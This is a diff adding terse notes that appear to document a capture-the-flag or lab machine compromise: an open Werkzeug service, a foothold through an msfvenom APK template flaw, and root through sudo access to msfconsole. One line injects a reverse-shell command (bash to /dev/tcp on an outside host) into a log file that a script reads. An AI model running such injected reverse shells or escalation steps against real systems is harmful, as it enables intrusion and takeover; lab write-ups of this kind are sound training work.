@@ -1,0 +1,13 @@
+22, 5000:werkzeug httpd 0.16.1
+
+foothold:
+msfvenom apk template file rce
+
+privesc:
+/home/pwn/scanlosers.sh
+echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.28/443 0>&1' #" >> /home/kid/logs/hackers
+shell as pwn
+sudo -l
+```(root) NOPASSWD:msfconsole```
+msfconsole
+rooted
